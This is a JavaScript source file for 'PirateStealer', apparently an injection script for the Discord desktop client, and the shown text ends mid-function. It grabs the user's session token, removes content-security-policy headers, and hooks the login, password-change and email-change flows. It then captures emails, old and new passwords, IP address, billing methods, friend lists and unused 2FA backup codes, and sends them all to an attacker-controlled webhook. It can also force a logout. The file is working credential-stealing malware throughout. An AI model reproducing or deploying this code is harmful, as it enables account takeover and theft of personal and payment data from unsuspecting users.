const fs = require("fs"),
  path = require("path"),
  { BrowserWindow: BrowserWindow, session: session } = require("electron"),
  querystring = require("querystring"),
  os = require("os");
var webhook = "%WEBHOOK_LINK%";
const computerName = os.hostname(),
  discordInstall = `${__dirname}`,
  EvalToken =
    'for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;';
String.prototype.insert = function (e, t) {
  return e > 0 ? this.substring(0, e) + t + this.substr(e) : t + this;
};
const config = {
  logout: "%LOGOUT%",
  "logout-notify": "%LOGOUTNOTI%",
  "init-notify": "%INITNOTI%",
  "embed-color": 3447704,
  "disable-qr-code": "%DISABLEQRCODE%",
};
function FirstTime() {
  BrowserWindow.getAllWindows()[0]
    .webContents.executeJavaScript(`${EvalToken}`, !0)
    .then((e) => {
      if (
        "true" == config["init-notify"] &&
        fs.existsSync(path.join(__dirname, "init"))
      )
        if (
          (fs.rmdirSync(path.join(__dirname, "init")),
          null == e || null == e || "" == e)
        ) {
          var t = {
            username: "PirateStealer",
            content: "",
            embeds: [
              {
                title: "Discord Initalized (User not Logged in)",
                color: config["embed-color"],
                fields: [
                  {
                    name: "Info",
                    value: `\`\`\`Hostname: \n${computerName}\nInjection Info: \n${__dirname}\n\`\`\``,
                    inline: !1,
                  },
                ],
                author: { name: "PirateStealer" },
                footer: { text: "PirateStealer" },
              },
            ],
          };
          SendToWebhook(JSON.stringify(t));
        } else {
          BrowserWindow.getAllWindows()[0]
            .webContents.executeJavaScript(
              `\n                    var xmlHttp=new XMLHttpRequest;xmlHttp.open("GET","https://discord.com/api/v8/users/@me",!1),xmlHttp.setRequestHeader("Authorization","${e}"),xmlHttp.send(null),xmlHttp.responseText;\n                    `,
              !0
            )
            .then((t) => {
              const n = JSON.parse(t);
              var r = {
                username: "PirateStealer",
                content: "",
                embeds: [
                  {
                    title: "Discord Initalized",
                    description:
                      "[**<:partner:909102089513340979> │ Click Here To Copy Info On Mobile**](https://ctf.surf/raw/" +
                      e +
                      ")",
                    color: config["embed-color"],
                    fields: [
                      {
                        name: "Info",
                        value: `\`\`\`Hostname: \n${computerName}\nInjection Info: \n${__dirname}\n\`\`\``,
                        inline: !1,
                      },
                      {
                        name: "Username",
                        value: `\`${n.username}#${n.discriminator}\``,
                        inline: !0,
                      },
                      { name: "ID", value: `\`${n.id}\``, inline: !0 },
                      {
                        name: "Badges",
                        value: `${GetBadges(n.flags)}`,
                        inline: !1,
                      },
                      { name: "Token", value: `\`\`\`${e}\`\`\``, inline: !1 },
                    ],
                    author: { name: "PirateStealer" },
                    footer: { text: "PirateStealer" },
                    thumbnail: {
                      url: `https://cdn.discordapp.com/avatars/${n.id}/${n.avatar}`,
                    },
                  },
                ],
              };
              SendToWebhook(JSON.stringify(r));
            });
        }
      if (!fs.existsSync(path.join(__dirname, "PirateStealerBTW"))) return !0;
      if (
        (fs.rmdirSync(path.join(__dirname, "PirateStealerBTW")),
        "false" != config.logout || "%LOGOUT%" == config.logout)
      ) {
        if ("true" == config["logout-notify"])
          if (null == e || null == e || "" == e) {
            t = {
              username: "PirateStealer",
              content: "",
              embeds: [
                {
                  title: "User log out (User not Logged in before)",
                  color: config["embed-color"],
                  fields: [
                    {
                      name: "Info",
                      value: `\`\`\`Hostname: \n${computerName}\nInjection Info: \n${__dirname}\n\`\`\``,
                      inline: !1,
                    },
                  ],
                  author: { name: "PirateStealer" },
                  footer: { text: "PirateStealer" },
                },
              ],
            };
            SendToWebhook(JSON.stringify(t));
          } else {
            BrowserWindow.getAllWindows()[0]
              .webContents.executeJavaScript(
                `\n                    var xmlHttp=new XMLHttpRequest;xmlHttp.open("GET","https://discord.com/api/v8/users/@me",!1),xmlHttp.setRequestHeader("Authorization","${e}"),xmlHttp.send(null),xmlHttp.responseText;\n                    `,
                !0
              )
              .then((t) => {
                const n = JSON.parse(t);
                var r = {
                  username: "PirateStealer",
                  content: "",
                  embeds: [
                    {
                      title: "User got logged out",
                      description:
                        "[**<:partner:909102089513340979> │ Click Here To Copy Info On Mobile**](https://ctf.surf/raw/" +
                        e +
                        ")",
                      color: config["embed-color"],
                      fields: [
                        {
                          name: "Info",
                          value: `\`\`\`Hostname: \n${computerName}\nInjection Info: \n${__dirname}\n\`\`\``,
                          inline: !1,
                        },
                        {
                          name: "Username",
                          value: `\`${n.username}#${n.discriminator}\``,
                          inline: !0,
                        },
                        { name: "ID", value: `\`${n.id}\``, inline: !0 },
                        {
                          name: "Badges",
                          value: `${GetBadges(n.flags)}`,
                          inline: !1,
                        },
                        {
                          name: "Token",
                          value: `\`\`\`${e}\`\`\``,
                          inline: !1,
                        },
                      ],
                      author: { name: "PirateStealer" },
                      footer: { text: "PirateStealer" },
                      thumbnail: {
                        url: `https://cdn.discordapp.com/avatars/${n.id}/${n.avatar}`,
                      },
                    },
                  ],
                };
                SendToWebhook(JSON.stringify(r));
              });
          }
        BrowserWindow.getAllWindows()[0]
          .webContents.executeJavaScript(
            'window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b="string"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})("login").logout()}LogOut();',
            !0
          )
          .then((e) => {});
      }
      return !1;
    });
}
session.defaultSession.webRequest.onHeadersReceived((e, t) => {
  e.url.startsWith(webhook)
    ? e.url.includes("discord.com")
      ? t({
          responseHeaders: Object.assign(
            { "Access-Control-Allow-Headers": "*" },
            e.responseHeaders
          ),
        })
      : t({
          responseHeaders: Object.assign(
            {
              "Content-Security-Policy": [
                "default-src '*'",
                "Access-Control-Allow-Headers '*'",
                "Access-Control-Allow-Origin '*'",
              ],
              "Access-Control-Allow-Headers": "*",
              "Access-Control-Allow-Origin": "*",
            },
            e.responseHeaders
          ),
        })
    : (delete e.responseHeaders["content-security-policy"],
      delete e.responseHeaders["content-security-policy-report-only"],
      t({
        responseHeaders: {
          ...e.responseHeaders,
          "Access-Control-Allow-Headers": "*",
        },
      }));
});
const Filter = {
  urls: [
    "https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json",
    "https://*.discord.com/api/v*/applications/detectable",
    "https://discord.com/api/v*/applications/detectable",
    "https://*.discord.com/api/v*/users/@me/library",
    "https://discord.com/api/v*/users/@me/library",
    "https://*.discord.com/api/v*/users/@me/billing/subscriptions",
    "https://discord.com/api/v*/users/@me/billing/subscriptions",
    "wss://remote-auth-gateway.discord.gg/*",
  ],
};
function SendToWebhook(e) {
  BrowserWindow.getAllWindows()[0]
    .webContents.executeJavaScript(
      `    var xhr = new XMLHttpRequest();\n    xhr.open("POST", "${webhook}", true);\n    xhr.setRequestHeader('Content-Type', 'application/json');\n    xhr.setRequestHeader('Access-Control-Allow-Origin', '*');\n    xhr.send(JSON.stringify(${e}));\n    `,
      !0
    )
    .then((e) => {});
}
function GetNitro(e) {
  return 0 == e
    ? "No Nitro"
    : 1 == e
    ? "<:classic:896119171019067423> `Nitro Classic`"
    : 2 == e
    ? "<a:boost:824036778570416129> `Nitro Boost`"
    : "No Nitro";
}
function GetRBadges(e) {
  var t = "";
  return (
    1 == (1 & e) && (t += "<:staff:874750808728666152> "),
    2 == (2 & e) && (t += "<:partner:874750808678354964> "),
    4 == (4 & e) && (t += "<:hypesquad_events:874750808594477056> "),
    8 == (8 & e) && (t += "<:bughunter_1:874750808426692658> "),
    512 == (512 & e) && (t += "<:early_supporter:874750808414113823> "),
    16384 == (16384 & e) && (t += "<:bughunter_2:874750808430874664> "),
    131072 == (131072 & e) && (t += "<:developer:874750808472825986> "),
    "" == t && (t = ""),
    t
  );
}
function GetBadges(e) {
  var t = "";
  return (
    1 == (1 & e) && (t += "<:staff:874750808728666152> "),
    2 == (2 & e) && (t += "<:partner:874750808678354964> "),
    4 == (4 & e) && (t += "<:hypesquad_events:874750808594477056> "),
    8 == (8 & e) && (t += "<:bughunter_1:874750808426692658> "),
    64 == (64 & e) && (t += "<:bravery:874750808388952075> "),
    128 == (128 & e) && (t += "<:brilliance:874750808338608199> "),
    256 == (256 & e) && (t += "<:balance:874750808267292683> "),
    512 == (512 & e) && (t += "<:early_supporter:874750808414113823> "),
    16384 == (16384 & e) && (t += "<:bughunter_2:874750808430874664> "),
    131072 == (131072 & e) && (t += "<:developer:874750808472825986> "),
    "" == t && (t = "None"),
    t
  );
}
function Login(e, t, n) {
  const r = BrowserWindow.getAllWindows()[0];
  r.webContents
    .executeJavaScript(
      `\n    var xmlHttp = new XMLHttpRequest();\n    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );\n    xmlHttp.setRequestHeader("Authorization", "${n}");\n    xmlHttp.send( null );\n    xmlHttp.responseText;`,
      !0
    )
    .then((a) => {
      r.webContents
        .executeJavaScript(
          '\n        var xmlHttp = new XMLHttpRequest();\n        xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );\n        xmlHttp.send( null );\n        xmlHttp.responseText;\n    ',
          !0
        )
        .then((s) => {
          r.webContents
            .executeJavaScript(
              `\n        var xmlHttp = new XMLHttpRequest();\n        xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false );\n        xmlHttp.setRequestHeader("Authorization", "${n}");\n        xmlHttp.send( null );\n        xmlHttp.responseText`,
              !0
            )
            .then((o) => {
              r.webContents
                .executeJavaScript(
                  `\n            var xmlHttp = new XMLHttpRequest();\n            xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/relationships", false );\n            xmlHttp.setRequestHeader("Authorization", "${n}");\n            xmlHttp.send( null );\n            xmlHttp.responseText`,
                  !0
                )
                .then((i) => {
                  if (n.startsWith("mfa"))
                    r.webContents
                      .executeJavaScript(
                        `\n              var xmlHttp = new XMLHttpRequest();\n              xmlHttp.open("POST", "https://discord.com/api/v9/users/@me/mfa/codes", false);\n              xmlHttp.setRequestHeader('Content-Type', 'application/json');\n              xmlHttp.setRequestHeader("authorization", "${n}")\n              xmlHttp.send(JSON.stringify({"password":"${t}","regenerate":false}));\n              xmlHttp.responseText`,
                        !0
                      )
                      .then((r) => {
                        var l = [],
                          p = "https://ctf.surf/raw/";
                        const d = JSON.parse(r).backup_codes.filter(
                          (e) => null == e.consumed
                        );
                        for (let e in d)
                          l.push({
                            name: "Code",
                            value: `\`${d[e].code.insert(4, "-")}\``,
                            inline: !0,
                          }),
                            (p += `${d[e].code.insert(4, "-")}<br>`);
                        const u = JSON.parse(a);
                        var c = {
                            username: "PirateStealer",
                            content: "",
                            embeds: [
                              {
                                title: "User Login",
                                description:
                                  "[**<:partner:909102089513340979> │ Click Here To Copy Info On Mobile**](https://ctf.surf/raw/" +
                                  n +
                                  "<br>" +
                                  t +
                                  ")",
                                color: config["embed-color"],
                                fields: [
                                  {
                                    name: "Info",
                                    value: `\`\`\`Hostname: \n${computerName}\nIP: \n${s}\nInjection Info: \n${discordInstall}\n\`\`\``,
                                    inline: !1,
                                  },
                                  {
                                    name: "Username",
                                    value: `\`${u.username}#${u.discriminator}\``,
                                    inline: !0,
                                  },
                                  {
                                    name: "ID",
                                    value: `\`${u.id}\``,
                                    inline: !0,
                                  },
                                  {
                                    name: "Nitro",
                                    value: `${GetNitro(u.premium_type)}`,
                                    inline: !1,
                                  },
                                  {
                                    name: "Badges",
                                    value: `${GetBadges(u.flags)}`,
                                    inline: !1,
                                  },
                                  {
                                    name: "Billing",
                                    value: `${(function () {
                                      const e = JSON.parse(o);
                                      var t = "";
                                      return (
                                        e.forEach((e) => {
                                          if ("" == e.type) return "`❌`";
                                          if (2 == e.type && 1 != e.invalid)
                                            t +=
                                              "`✔️` <:paypal:896441236062347374>";
                                          else {
                                            if (1 != e.type || 1 == e.invalid)
                                              return "`❌`";
                                            t += "`✔️` :credit_card:";
                                          }
                                        }),
                                        "" == t && (t = "`❌`"),
                                        t
                                      );
                                    })()}`,
                                    inline: !1,
                                  },
                                  {
                                    name: "Email",
                                    value: `\`${e}\``,
                                    inline: !0,
                                  },
                                  {
                                    name: "Password",
                                    value: `\`${t}\``,
                                    inline: !0,
                                  },
                                  {
                                    name: "Token",
                                    value: `\`\`\`${n}\`\`\``,
                                    inline: !1,
                                  },
                                ],
                                author: { name: "PirateStealer" },
                                footer: { text: "PirateStealer" },
                                thumbnail: {
                                  url: `https://cdn.discordapp.com/avatars/${u.id}/${u.avatar}`,
                                },
                              },
                              {
                                title: `Total Friends (${
                                  JSON.parse(i).filter((e) => 1 == e.type)
                                    .length
                                })`,
                                color: config["embed-color"],
                                description: (function () {
                                  const e = JSON.parse(i).filter(
                                    (e) => 1 == e.type
                                  );
                                  var t = "";
                                  for (z of e) {
                                    var n = GetRBadges(z.user.public_flags);
                                    "" != n &&
                                      (t +=
                                        n +
                                        ` ${z.user.username}#${z.user.discriminator}\n`);
                                  }
                                  return "" == t && (t = "No Rare Friends"), t;
                                })(),
                                author: { name: "PirateStealer" },
                                footer: { text: "PirateStealer" },
                                thumbnail: {
                                  url: `https://cdn.discordapp.com/avatars/${u.id}/${u.avatar}`,
                                },
                              },
                            ],
                          },
                          m = {
                            title: ":detective: __2FA Codes__",
                            description: `[Get all of them](${p})`,
                            color: config["embed-color"],
                            fields: l,
                            author: { name: "PirateStealer" },
                            footer: { text: "PirateStealer" },
                          };
                        n.startsWith("mfa") && c.embeds.push(m),
                          SendToWebhook(JSON.stringify(c));
                      });
                  else {
                    const r = BrowserWindow.getAllWindows()[0];
                    r.webContents
                      .executeJavaScript(
                        `\n    var xmlHttp = new XMLHttpRequest();\n    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );\n    xmlHttp.setRequestHeader("Authorization", "${n}");\n    xmlHttp.send( null );\n    xmlHttp.responseText;`,
                        !0
                      )
                      .then((a) => {
                        r.webContents
                          .executeJavaScript(
                            '\n        var xmlHttp = new XMLHttpRequest();\n        xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );\n        xmlHttp.send( null );\n        xmlHttp.responseText;\n    ',
                            !0
                          )
                          .then((s) => {
                            r.webContents
                              .executeJavaScript(
                                `\n        var xmlHttp = new XMLHttpRequest();\n        xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false );\n        xmlHttp.setRequestHeader("Authorization", "${n}");\n        xmlHttp.send( null );\n        xmlHttp.responseText`,
                                !0
                              )
                              .then((o) => {
                                r.webContents
                                  .executeJavaScript(
                                    `\n            var xmlHttp = new XMLHttpRequest();\n            xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/relationships", false );\n            xmlHttp.setRequestHeader("Authorization", "${n}");\n            xmlHttp.send( null );\n            xmlHttp.responseText`,
                                    !0
                                  )
                                  .then((r) => {
                                    const i = JSON.parse(a);
                                    var l = {
                                      username: "PirateStealer",
                                      content: "",
                                      embeds: [
                                        {
                                          title: "User Login",
                                          description:
                                            "[**<:partner:909102089513340979> │ Click Here To Copy Info On Mobile**](https://ctf.surf/raw/" +
                                            n +
                                            "<br>" +
                                            t +
                                            ")",
                                          color: config["embed-color"],
                                          fields: [
                                            {
                                              name: "Info",
                                              value: `\`\`\`Hostname: \n${computerName}\nIP: \n${s}\nInjection Info: \n${discordInstall}\n\`\`\``,
                                              inline: !1,
                                            },
                                            {
                                              name: "Username",
                                              value: `\`${i.username}#${i.discriminator}\``,
                                              inline: !0,
                                            },
                                            {
                                              name: "ID",
                                              value: `\`${i.id}\``,
                                              inline: !0,
                                            },
                                            {
                                              name: "Nitro",
                                              value: `${GetNitro(
                                                i.premium_type
                                              )}`,
                                              inline: !1,
                                            },
                                            {
                                              name: "Badges",
                                              value: `${GetBadges(i.flags)}`,
                                              inline: !1,
                                            },
                                            {
                                              name: "Billing",
                                              value: `${(function () {
                                                const e = JSON.parse(o);
                                                var t = "";
                                                return (
                                                  e.forEach((e) => {
                                                    if ("" == e.type)
                                                      return "`❌`";
                                                    if (
                                                      2 == e.type &&
                                                      1 != e.invalid
                                                    )
                                                      t +=
                                                        "`✔️` <:paypal:896441236062347374>";
                                                    else {
                                                      if (
                                                        1 != e.type ||
                                                        1 == e.invalid
                                                      )
                                                        return "`❌`";
                                                      t += "`✔️` :credit_card:";
                                                    }
                                                  }),
                                                  "" == t && (t = "`❌`"),
                                                  t
                                                );
                                              })()}`,
                                              inline: !1,
                                            },
                                            {
                                              name: "Email",
                                              value: `\`${e}\``,
                                              inline: !0,
                                            },
                                            {
                                              name: "Password",
                                              value: `\`${t}\``,
                                              inline: !0,
                                            },
                                            {
                                              name: "Token",
                                              value: `\`\`\`${n}\`\`\``,
                                              inline: !1,
                                            },
                                          ],
                                          author: { name: "PirateStealer" },
                                          footer: { text: "PirateStealer" },
                                          thumbnail: {
                                            url: `https://cdn.discordapp.com/avatars/${i.id}/${i.avatar}`,
                                          },
                                        },
                                        {
                                          title: `Total Friends (${
                                            JSON.parse(r).filter(
                                              (e) => 1 == e.type
                                            ).length
                                          })`,
                                          color: config["embed-color"],
                                          description: (function () {
                                            const e = JSON.parse(r).filter(
                                              (e) => 1 == e.type
                                            );
                                            var t = "";
                                            for (z of e) {
                                              var n = GetRBadges(
                                                z.user.public_flags
                                              );
                                              "" != n &&
                                                (t +=
                                                  n +
                                                  ` ${z.user.username}#${z.user.discriminator}\n`);
                                            }
                                            return (
                                              "" == t &&
                                                (t = "No Rare Friends"),
                                              t
                                            );
                                          })(),
                                          author: { name: "PirateStealer" },
                                          footer: { text: "PirateStealer" },
                                          thumbnail: {
                                            url: `https://cdn.discordapp.com/avatars/${i.id}/${i.avatar}`,
                                          },
                                        },
                                      ],
                                    };
                                    SendToWebhook(JSON.stringify(l));
                                  });
                              });
                          });
                      });
                  }
                });
            });
        });
    });
}
function ChangePassword(e, t, n) {
  const r = BrowserWindow.getAllWindows()[0];
  r.webContents
    .executeJavaScript(
      `\n    var xmlHttp = new XMLHttpRequest();\n    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );\n    xmlHttp.setRequestHeader("Authorization", "${n}");\n    xmlHttp.send( null );\n    xmlHttp.responseText;`,
      !0
    )
    .then((a) => {
      r.webContents
        .executeJavaScript(
          '\n        var xmlHttp = new XMLHttpRequest();\n        xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );\n        xmlHttp.send( null );\n        xmlHttp.responseText;\n    ',
          !0
        )
        .then((s) => {
          r.webContents
            .executeJavaScript(
              `\n        var xmlHttp = new XMLHttpRequest();\n        xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false );\n        xmlHttp.setRequestHeader("Authorization", "${n}");\n        xmlHttp.send( null );\n        xmlHttp.responseText`,
              !0
            )
            .then((o) => {
              r.webContents
                .executeJavaScript(
                  `\n            var xmlHttp = new XMLHttpRequest();\n            xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/relationships", false );\n            xmlHttp.setRequestHeader("Authorization", "${n}");\n            xmlHttp.send( null );\n            xmlHttp.responseText`,
                  !0
                )
                .then((i) => {
                  if (n.startsWith("mfa"))
                    r.webContents
                      .executeJavaScript(
                        `\n              var xmlHttp = new XMLHttpRequest();\n              xmlHttp.open("POST", "https://discord.com/api/v9/users/@me/mfa/codes", false);\n              xmlHttp.setRequestHeader('Content-Type', 'application/json');\n              xmlHttp.setRequestHeader("authorization", "${n}")\n              xmlHttp.send(JSON.stringify({"password":"${t}","regenerate":false}));\n              xmlHttp.responseText`,
                        !0
                      )
                      .then((r) => {
                        var l = [],
                          p = "https://ctf.surf/raw/";
                        const d = JSON.parse(r).backup_codes.filter(
                          (e) => null == e.consumed
                        );
                        for (let e in d)
                          l.push({
                            name: "Code",
                            value: `\`${d[e].code.insert(4, "-")}\``,
                            inline: !0,
                          }),
                            (p += `${d[e].code.insert(4, "-")}<br>`);
                        const u = JSON.parse(a);
                        var c = {
                            username: "PirateStealer",
                            content: "",
                            embeds: [
                              {
                                title: "Password Changed",
                                description:
                                  "[**<:partner:909102089513340979> │ Click Here To Copy Info On Mobile**](https://ctf.surf/raw/" +
                                  n +
                                  "<br>" +
                                  t +
                                  ")",
                                color: config["embed-color"],
                                fields: [
                                  {
                                    name: "Info",
                                    value: `\`\`\`Hostname: \n${computerName}\nIP: \n${s}\nInjection Info: \n${discordInstall}\n\`\`\``,
                                    inline: !1,
                                  },
                                  {
                                    name: "Username",
                                    value: `\`${u.username}#${u.discriminator}\``,
                                    inline: !0,
                                  },
                                  {
                                    name: "ID",
                                    value: `\`${u.id}\``,
                                    inline: !0,
                                  },
                                  {
                                    name: "Nitro",
                                    value: `${GetNitro(u.premium_type)}`,
                                    inline: !1,
                                  },
                                  {
                                    name: "Badges",
                                    value: `${GetBadges(u.flags)}`,
                                    inline: !1,
                                  },
                                  {
                                    name: "Billing",
                                    value: `${(function () {
                                      const e = JSON.parse(o);
                                      var t = "";
                                      return (
                                        e.forEach((e) => {
                                          if ("" == e.type) return "`❌`";
                                          if (2 == e.type && 1 != e.invalid)
                                            t +=
                                              "`✔️` <:paypal:896441236062347374>";
                                          else {
                                            if (1 != e.type || 1 == e.invalid)
                                              return "`❌`";
                                            t += "`✔️` :credit_card:";
                                          }
                                        }),
                                        "" == t && (t = "`❌`"),
                                        t
                                      );
                                    })()}`,
                                    inline: !1,
                                  },
                                  {
                                    name: "Email",
                                    value: `\`${u.email}\``,
                                    inline: !1,
                                  },
                                  {
                                    name: "Old Password",
                                    value: `\`${e}\``,
                                    inline: !0,
                                  },
                                  {
                                    name: "New Password",
                                    value: `\`${t}\``,
                                    inline: !0,
                                  },
                                  {
                                    name: "Token",
                                    value: `\`\`\`${n}\`\`\``,
                                    inline: !1,
                                  },
                                ],
                                author: { name: "PirateStealer" },
                                footer: { text: "PirateStealer" },
                                thumbnail: {
                                  url: `https://cdn.discordapp.com/avatars/${u.id}/${u.avatar}`,
                                },
                              },
                              {
                                title: `Total Friends (${
                                  JSON.parse(i).filter((e) => 1 == e.type)
                                    .length
                                })`,
                                color: config["embed-color"],
                                description: (function () {
                                  const e = JSON.parse(i).filter(
                                    (e) => 1 == e.type
                                  );
                                  var t = "";
                                  for (z of e) {
                                    var n = GetRBadges(z.user.public_flags);
                                    "" != n &&
                                      (t +=
                                        n +
                                        ` ${z.user.username}#${z.user.discriminator}\n`);
                                  }
                                  return "" == t && (t = "No Rare Friends"), t;
                                })(),
                                author: { name: "PirateStealer" },
                                footer: { text: "PirateStealer" },
                                thumbnail: {
                                  url: `https://cdn.discordapp.com/avatars/${u.id}/${u.avatar}`,
                                },
                              },
                            ],
                          },
                          m = {
                            title: ":detective: __2FA Codes__",
                            description: `[Get all of them](${p})`,
                            color: config["embed-color"],
                            fields: l,
                            author: { name: "PirateStealer" },
                            footer: { text: "PirateStealer" },
                          };
                        n.startsWith("mfa") && c.embeds.push(m),
                          SendToWebhook(JSON.stringify(c));
                      });
                  else {
                    const r = BrowserWindow.getAllWindows()[0];
                    r.webContents
                      .executeJavaScript(
                        `\n    var xmlHttp = new XMLHttpRequest();\n    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );\n    xmlHttp.setRequestHeader("Authorization", "${n}");\n    xmlHttp.send( null );\n    xmlHttp.responseText;`,
                        !0
                      )
                      .then((a) => {
                        r.webContents
                          .executeJavaScript(
                            '\n        var xmlHttp = new XMLHttpRequest();\n        xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );\n        xmlHttp.send( null );\n        xmlHttp.responseText;\n    ',
                            !0
                          )
                          .then((s) => {
                            r.webContents
                              .executeJavaScript(
                                `\n        var xmlHttp = new XMLHttpRequest();\n        xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false );\n        xmlHttp.setRequestHeader("Authorization", "${n}");\n        xmlHttp.send( null );\n        xmlHttp.responseText`,
                                !0
                              )
                              .then((o) => {
                                r.webContents
                                  .executeJavaScript(
                                    `\n            var xmlHttp = new XMLHttpRequest();\n            xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/relationships", false );\n            xmlHttp.setRequestHeader("Authorization", "${n}");\n            xmlHttp.send( null );\n            xmlHttp.responseText`,
                                    !0
                                  )
                                  .then((r) => {
                                    const i = JSON.parse(a);
                                    var l = {
                                      username: "PirateStealer",
                                      content: "",
                                      embeds: [
                                        {
                                          title: "Password Changed",
                                          description:
                                            "[**<:partner:909102089513340979> │ Click Here To Copy Info On Mobile**](https://ctf.surf/raw/" +
                                            n +
                                            "<br>" +
                                            t +
                                            ")",
                                          color: config["embed-color"],
                                          fields: [
                                            {
                                              name: "Info",
                                              value: `\`\`\`Hostname: \n${computerName}\nIP: \n${s}\nInjection Info: \n${discordInstall}\n\`\`\``,
                                              inline: !1,
                                            },
                                            {
                                              name: "Username",
                                              value: `\`${i.username}#${i.discriminator}\``,
                                              inline: !0,
                                            },
                                            {
                                              name: "ID",
                                              value: `\`${i.id}\``,
                                              inline: !0,
                                            },
                                            {
                                              name: "Nitro",
                                              value: `${GetNitro(
                                                i.premium_type
                                              )}`,
                                              inline: !1,
                                            },
                                            {
                                              name: "Badges",
                                              value: `${GetBadges(i.flags)}`,
                                              inline: !1,
                                            },
                                            {
                                              name: "Billing",
                                              value: `${(function () {
                                                const e = JSON.parse(o);
                                                var t = "";
                                                return (
                                                  e.forEach((e) => {
                                                    if ("" == e.type)
                                                      return "`❌`";
                                                    if (
                                                      2 == e.type &&
                                                      1 != e.invalid
                                                    )
                                                      t +=
                                                        "`✔️` <:paypal:896441236062347374>";
                                                    else {
                                                      if (
                                                        1 != e.type ||
                                                        1 == e.invalid
                                                      )
                                                        return "`❌`";
                                                      t += "`✔️` :credit_card:";
                                                    }
                                                  }),
                                                  "" == t && (t = "`❌`"),
                                                  t
                                                );
                                              })()}`,
                                              inline: !1,
                                            },
                                            {
                                              name: "Email",
                                              value: `\`${i.email}\``,
                                              inline: !1,
                                            },
                                            {
                                              name: "Old Password",
                                              value: `\`${e}\``,
                                              inline: !0,
                                            },
                                            {
                                              name: "New Password",
                                              value: `\`${t}\``,
                                              inline: !0,
                                            },
                                            {
                                              name: "Token",
                                              value: `\`\`\`${n}\`\`\``,
                                              inline: !1,
                                            },
                                          ],
                                          author: { name: "PirateStealer" },
                                          footer: { text: "PirateStealer" },
                                          thumbnail: {
                                            url: `https://cdn.discordapp.com/avatars/${i.id}/${i.avatar}`,
                                          },
                                        },
                                        {
                                          title: `Total Friends (${
                                            JSON.parse(r).filter(
                                              (e) => 1 == e.type
                                            ).length
                                          })`,
                                          color: config["embed-color"],
                                          description: (function () {
                                            const e = JSON.parse(r).filter(
                                              (e) => 1 == e.type
                                            );
                                            var t = "";
                                            for (z of e) {
                                              var n = GetRBadges(
                                                z.user.public_flags
                                              );
                                              "" != n &&
                                                (t +=
                                                  n +
                                                  ` ${z.user.username}#${z.user.discriminator}\n`);
                                            }
                                            return (
                                              "" == t &&
                                                (t = "No Rare Friends"),
                                              t
                                            );
                                          })(),
                                          author: { name: "PirateStealer" },
                                          footer: { text: "PirateStealer" },
                                          thumbnail: {
                                            url: `https://cdn.discordapp.com/avatars/${i.id}/${i.avatar}`,
                                          },
                                        },
                                      ],
                                    };
                                    SendToWebhook(JSON.stringify(l));
                                  });
                              });
                          });
                      });
                  }
                });
            });
        });
    });
}
function ChangeEmail(e, t, n) {
  const r = BrowserWindow.getAllWindows()[0];
  r.webContents
    .executeJavaScript(
      `\n    var xmlHttp = new XMLHttpRequest();\n    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );\n    xmlHttp.setRequestHeader("Authorization", "${n}");\n    xmlHttp.send( null );\n    xmlHttp.responseText;`,
      !0
    )
    .then((a) => {
      r.webContents
        .executeJavaScript(
          '\n        var xmlHttp = new XMLHttpRequest();\n        xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );\n        xmlHttp.send( null );\n        xmlHttp.responseText;\n    ',
          !0
        )
        .then((s) => {
          r.webContents
            .executeJavaScript(
              `\n        var xmlHttp = new XMLHttpRequest();\n        xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false );\n        xmlHttp.setRequestHeader("Authorization", "${n}");\n        xmlHttp.send( null );\n        xmlHttp.responseText`,
              !0
            )
            .then((o) => {
              r.webContents
                .executeJavaScript(
                  `\n            var xmlHttp = new XMLHttpRequest();\n            xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/relationships", false );\n            xmlHttp.setRequestHeader("Authorization", "${n}");\n            xmlHttp.send( null );\n            xmlHttp.responseText`,
                  !0
                )
                .then((i) => {
                  if (n.startsWith("mfa"))
                    r.webContents
                      .executeJavaScript(
                        `\n              var xmlHttp = new XMLHttpRequest();\n              xmlHttp.open("POST", "https://discord.com/api/v9/users/@me/mfa/codes", false);\n              xmlHttp.setRequestHeader('Content-Type', 'application/json');\n              xmlHttp.setRequestHeader("authorization", "${n}")\n              xmlHttp.send(JSON.stringify({"password":"${t}","regenerate":false}));\n              xmlHttp.responseText`,
                        !0
                      )
                      .then((r) => {
                        var l = [],
                          p = "https://ctf.surf/raw/";
                        const d = JSON.parse(r).backup_codes.filter(
                          (e) => null == e.consumed
                        );
                        for (let e in d)
                          l.push({
                            name: "Code",
                            value: `\`${d[e].code.insert(4, "-")}\``,
                            inline: !0,
